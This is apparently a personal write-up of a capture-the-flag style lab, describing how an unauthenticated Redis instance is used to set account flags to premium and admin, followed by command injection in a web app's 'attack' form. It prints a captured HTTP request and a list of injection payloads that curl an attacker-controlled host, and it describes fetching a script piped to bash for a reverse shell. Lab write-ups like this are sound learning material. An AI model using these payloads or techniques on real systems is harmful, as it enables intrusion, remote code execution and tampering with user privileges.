---
created: 2026-03-13
modified: 2026-03-13
---

Ooops I already did the lab but i will just write the attack path i followed but there will be no screenshot and command ouputs.

First we start with a nmap scan which reveals 3 ports, 22, 80 and 6379 for redis.

at port 80 we have a web app. We have a login page .. tried SQLi but the app seemed well protected against this attack buit luckily we can create an account. 

After creating an account and signing in.. we get an attack panel with two fields... one for an IP where can enter any IP we want or any data we want .. the second was a menu where we had one option.. the attack panel simulated a simple ddos attack. So i keyed in my ip and start up tcpdump to see if it actual works .. hitting the attack button i get the error that we need to have a premium account to execute the attack "currently we are at a free version"

In redis we can authenticate without credentials.. enumerating keys i found one linked to my account .. redeing the values of the key i got the details of my account .. with fielst like isPremium and isAdmin set to false .. so i modified both fields to be true and reloding the web aplication we see a chnage from free version to premium and with that i was able to execute the attack.

Redis is an **open-source, in-memory data structure store** used as a database, cache, message broker, and streaming engine. Its main purpose is to deliver extremely fast data access by keeping information in memory rather than relying on disk storage, while still offering persistence options when needed. Redis supports a variety of data types—such as strings, hashes, lists, sets, and sorted sets—making it versatile for use cases like caching frequently accessed data, managing sessions, handling real-time analytics, supporting pub/sub messaging, and even powering queues or leaderboards. Its lightweight design and low latency make it especially popular for applications that require **high performance and scalability**.

Luckily i still have burp oipen so i still have the requests.. the attack request was this 

```
POST /attack HTTP/1.1
Host: blackbot.hv
Content-Length: 48
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://blackbot.hv
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://blackbot.hv/attack
Accept-Encoding: gzip, deflate, br
Cookie: sessionID=4813bda5-27f7-4987-8f81-bbdb8815ad28
Connection: keep-alive

target=10.8.52.112&type=tcp-syn-flood
```

It pointed to command injectionso i needed to use a short custom wordlist to test 

```
; curl http://10.8.52.112:8000/base64.txt
| curl http://10.8.52.112:8000/base64.txt
&& curl http://10.8.52.112:8000/base64.txt
|| curl http://10.8.52.112:8000/base64.txt
`curl http://10.8.52.112:8000/base64.txt`
$(curl http://10.8.52.112:8000/base64.txt)
; curl${IFS}http://10.8.52.112:8000/base64.txt
| curl${IFS}http://10.8.52.112:8000/base64.txt
`curl${IFS}http://10.8.52.112:8000/base64.txt`
$(curl${IFS}http://10.8.52.112:8000/base64.txt)
%0a curl http://10.8.52.112:8000/base64.txt
%26%26 curl http://10.8.52.112:8000/base64.txt
%7C curl http://10.8.52.112:8000/base64.txt
```

and in burp instruder i set my payload at this position 

![[Pasted_image_20250911102657.png]]

I got 4 hits in my server and tracting the requests that had hit my server based on the response time of the request since the size of the response was the same all through, i realized that all request had one thing in common ... they had this `{IFS}` 

I modified the request to fetch a rev.sh file and the piping it to bash to get a reverse shell. After that all the other things we simple..

The tricky part was the command injection it took me some time before identifying it.


